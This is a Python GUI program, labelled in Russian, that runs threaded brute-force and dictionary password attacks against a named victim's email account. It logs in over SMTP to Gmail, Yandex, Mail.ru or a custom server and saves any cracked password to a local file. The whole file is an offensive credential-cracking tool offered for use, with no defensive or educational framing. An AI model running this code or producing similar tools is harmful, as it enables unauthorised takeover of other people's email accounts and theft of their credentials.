import flet as ft
import smtplib
import itertools
from time import sleep
from threading import Thread

def connect_to_server(server, port, protocol):
    smtpserver = None
    if protocol == "ssl":
        smtpserver = smtplib.SMTP_SSL(server, port)
    elif protocol == "tls":
        smtpserver = smtplib.SMTP(server, port)
    smtpserver.ehlo()
    return smtpserver

def main(page: ft.Page):
    page.title = "Email Brute Force"
    page.theme_mode = "light"

    def on_submit(e):
        user = user_input.value
        smtpserver = None
        
        if smtp_server.value == "Gmail":
            smtpserver = connect_to_server("smtp.gmail.com", 587, "tls")
        elif smtp_server.value == "Yandex":
            smtpserver = connect_to_server("smtp.yandex.ru", 465, "ssl")
        elif smtp_server.value == "Mail.ru":
            smtpserver = connect_to_server("smtp.mail.ru", 465, "ssl")
        elif smtp_server.value == "Custom":
            custom_server = custom_server_input.value
            custom_port = int(custom_port_input.value)
            custom_protocol = custom_protocol_input.value.lower()
            smtpserver = connect_to_server(custom_server, custom_port, custom_protocol)
        
        page.add(ft.Text("Connected to server, ready to attack.", color="green"))

        thread_count = int(thread_count_input.value)

        if attack_method.value == "Brute Force":
            min_pass = int(min_pass_input.value)
            start_brute_force_attack(smtpserver, user, min_pass, 0.0002 if pi_option.value else 0, thread_count)
        elif attack_method.value == "Dictionary":
            passwfile_path = dict_path_input.value
            start_dictionary_attack(smtpserver, user, passwfile_path, thread_count)

    def start_brute_force_attack(smtpserver, user, min_pass, delay, thread_count):
        def brute_force_thread(minlen, maxlen, delay):
            for password in generate_passwords("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;", minlen, maxlen):
                sleep(delay)
                try:
                    smtpserver.login(user, password)
                    page.add(ft.Text(f"[+] Пароль подобран: {password}", color="green"))
                    with open("password_cracked.txt", "w") as file:
                        file.write(f"Емейл: {user}\nПароль: {password}\n")
                    page.add(ft.Text("Пароль сохранен! Ищи <password_cracked.txt> в папке с брутером", color="blue"))
                    return
                except smtplib.SMTPAuthenticationError:
                    page.add(ft.Text(f"[!] пароль неверен: {password}", color="red"))

        def generate_passwords(chars, minlen, maxlen):
            for n in range(minlen, maxlen + 1):
                for perm in itertools.product(chars, repeat=n):
                    yield ''.join(perm)
        
        threads = []
        for i in range(thread_count):
            t = Thread(target=brute_force_thread, args=(min_pass, 64, delay))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()

    def start_dictionary_attack(smtpserver, user, passwfile_path, thread_count):
        with open(passwfile_path, "r") as passwfile:
            passwords = passwfile.readlines()

        def dictionary_thread(passwords):
            for password in passwords:
                password = password.strip()
                try:
                    smtpserver.login(user, password)
                    page.add(ft.Text(f"[+] Пароль подобран: {password}", color="green"))
                    with open("password_cracked.txt", "w") as file:
                        file.write(f"Емейл: {user}\nПароль: {password}\n")
                    page.add(ft.Text("Пароль сохранен! Ищи <password_cracked.txt> в папке с брутером", color="blue"))
                    return
                except smtplib.SMTPAuthenticationError:
                    page.add(ft.Text(f"[!] пароль неверен: {password}", color="red"))

        chunk_size = len(passwords) // thread_count
        threads = []
        for i in range(thread_count):
            chunk = passwords[i*chunk_size:(i+1)*chunk_size]
            t = Thread(target=dictionary_thread, args=(chunk,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    def update_attack_options(e):
        min_pass_input.visible = attack_method.value == "Brute Force"
        dict_path_input.visible = attack_method.value == "Dictionary"
        page.update()

    def update_smtp_options(e):
        custom_server_input.visible = smtp_server.value == "Custom"
        custom_port_input.visible = smtp_server.value == "Custom"
        custom_protocol_input.visible = smtp_server.value == "Custom"
        page.update()

    user_input = ft.TextField(label="Введите почту жертвы")
    attack_method = ft.Dropdown(label="Метод атаки", options=[
        ft.dropdown.Option("Brute Force"),
        ft.dropdown.Option("Dictionary")
    ], on_change=update_attack_options)
    smtp_server = ft.Dropdown(label="SMTP сервер", options=[
        ft.dropdown.Option("Gmail"),
        ft.dropdown.Option("Yandex"),
        ft.dropdown.Option("Mail.ru"),
        ft.dropdown.Option("Custom")
    ], on_change=update_smtp_options)
    custom_server_input = ft.TextField(label="SMTP сервер (Custom)", visible=False)
    custom_port_input = ft.TextField(label="Порт (Custom)", visible=False)
    custom_protocol_input = ft.TextField(label="Протокол (tls/ssl)", visible=False)
    min_pass_input = ft.TextField(label="Минимальный размер пароля", visible=False)
    dict_path_input = ft.TextField(label="Путь до словаря", visible=False)
    thread_count_input = ft.TextField(label="Количество потоков", value="1")
    pi_option = ft.Checkbox(label="Включить модификации для Raspberry PI")

    page.add(
        user_input,
        attack_method,
        smtp_server,
        custom_server_input,
        custom_port_input,
        custom_protocol_input,
        min_pass_input,
        dict_path_input,
        thread_count_input,
        pi_option,
        ft.ElevatedButton("Начать атаку", on_click=on_submit)
    )

ft.app(target=main)
